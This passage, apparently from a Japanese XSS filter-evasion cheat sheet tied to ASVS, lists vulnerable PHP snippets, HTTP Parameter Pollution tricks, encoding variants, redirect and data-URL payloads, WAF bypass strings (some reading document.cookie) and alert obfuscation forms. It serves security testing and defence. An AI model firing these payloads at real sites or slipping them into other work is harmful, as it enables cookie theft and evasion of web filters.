#### 攻撃ベクタとしての Content Replace

コンテンツ置換処理が入力を再解釈する場合、置換後の文字列が XSS ベクタになる可能性がある。

```html
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
```text

### HTTP Parameter Pollution による XSS の補助

HTTP Parameter Pollution (HPP) は、同名パラメータの扱いがコンポーネントごとに異なることを使い、WAF とアプリケーションの解釈差を作る。次の例は、コンテンツページと共有ページの処理差により XSS を助ける流れを示す。

#### コンテンツページのソースコード

```php
<?
$content = $_GET['content'];
echo $content;
?>
```text

#### 共有ページのソースコード

```php
<?
$val = $_GET['val'];
echo '<a href="/content.php?content='.$val.'">Click here</a>';
?>
```text

#### コンテンツページの出力

```html
<script>alert(1)</script>
```text

#### 共有ページの出力

共有ページの出力は、分割されたパラメータが最終的に結合されることで、次のような XSS を形成し得る。

```html
<a href="/content.php?content=<script>alert(1)</script>">Click here</a>
```text

## 文字エスケープシーケンス

この節は、XSS フィルタを回避するために使われる JavaScript と HTML の文字エスケープ形式をまとめる。10 進、16 進、Unicode、CSS エスケープ、URL エンコード、混合エンコードなどは、フィルタが正規化前の文字列だけを見ている場合に検出を難しくする。防御側は、入力検証だけに依存せず、出力コンテキストに応じたエンコーディングと安全なサニタイズを適用し、複数段階のデコード差を前提にテストする必要がある。

```text
<SCRIPT>alert('XSS')</SCRIPT>
%3CSCRIPT%3Ealert('XSS')%3C/SCRIPT%3E
\u003cSCRIPT\u003ealert('XSS')\u003c/SCRIPT\u003e
&#x3c;SCRIPT&#x3e;alert('XSS')&#x3c;/SCRIPT&#x3e;
```text

## WAF をバイパスする方法 - Cross-Site Scripting

### 一般的な問題

#### 保存型 XSS

攻撃者がフィルタを通過して XSS を保存できた場合、WAF はその攻撃の実行を防げない。

#### JavaScript 内の反射型 XSS

例:

```javascript
<script> ... setTimeout(\"writetitle()\",$\_GET\[xss\]) ... </script>
```text

悪用:

```javascript
/?xss=500); alert(document.cookie);//
```text

#### DOM ベース XSS

例:

```javascript
<script> ... eval($\_GET\[xss\]); ... </script>
```text

悪用:

```javascript
/?xss=document.cookie
```text

#### リクエストリダイレクト経由の XSS

脆弱なコード:

```javascript
...
header('Location: '.$_GET['param']);
...
```text

同様に:

```javascript
...
header('Refresh: 0; URL='.$_GET['param']);
...
```text

このリクエストは WAF を通過しない。

```html
/?param=<javascript:alert(document.cookie>)
```text

このリクエストは WAF を通過し、特定のブラウザで XSS 攻撃が実行される。

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```text

### XSS のための WAF バイパス文字列

次の文字列は、WAF やフィルタがイベントハンドラ、要素名、エンコード、data URL、名前空間、構文の揺らぎをどのように扱うかを確認するためのテストペイロードである。

<!-- markdownlint-disable MD038-->
- `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `<Video> <source onerror = "javascript: alert (XSS)">`
- `<Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
- `<form><a href="javascript:\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*{x:expression(alert(/xss/))}//<style></style>`

 On Mouse Over:

- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
- `<script x> alert(1) </script 1=2`
- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `
<!-- markdownlint-enable MD038-->

### フィルタバイパス Alert 難読化

次の例は、`alert` 呼び出しを別の構文やプロパティ参照、文字エスケープで表現し、単純な文字列検査を避ける手法である。

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\u0065rt(1)`
- `top[‘al\145rt’](1)`
- `top[‘al\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`
- `(alert())`

ペイロードには先頭と末尾のバッククォートを含める必要がある。

```javascript
&#96;`${alert``}`&#96;
```

## ASVS との対応

| ASVS 項目 | 関連内容 |
| --- | --- |
| V1.2 | 入力フィルタへの過信を避け、出力コンテキスト別エンコーディング、正規化、サニタイズ、XSS 回帰テストを組み合わせる。 |
| V3.2 | DOM Based XSS、ブラウザ解釈差、イベントハンドラ、CSP などのクライアント側防御を検証する。 |
